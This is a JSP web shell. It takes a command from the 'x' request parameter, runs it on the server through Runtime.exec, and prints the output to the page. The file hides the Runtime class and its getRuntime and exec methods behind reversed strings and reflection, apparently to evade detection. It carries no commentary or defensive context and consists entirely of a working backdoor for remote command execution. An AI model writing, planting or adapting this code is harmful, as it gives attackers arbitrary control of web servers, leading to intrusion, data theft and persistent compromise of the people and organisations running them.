<%@ page contentType="text/html;charset=UTF-8"  language="java" %>
<%@ page import="java.lang.reflect.Method"%>
<%!public static String reverseStr(String str){String reverse = "";int length = str.length();for (int i = 0; i < length; i++){reverse = str.charAt(i) + reverse;}return reverse;}%>
<%
String x = request.getParameter("x");
if(x!=null){
	Class rt = Class.forName(reverseStr("emitnuR.gnal.avaj"));
	Method gr = rt.getMethod(reverseStr("emitnuRteg"));
    Method ex = rt.getMethod(reverseStr("cexe"), String.class);
	Process e = (Process) ex.invoke(gr.invoke(null),  x);
	java.io.InputStream in = e.getInputStream();
	int a = -1;
	byte[] b = new byte[2048];
	out.print("<pre>");
	while((a=in.read(b))!=-1){
		out.println(new String(b));
	}
	out.print("</pre>");
}
%>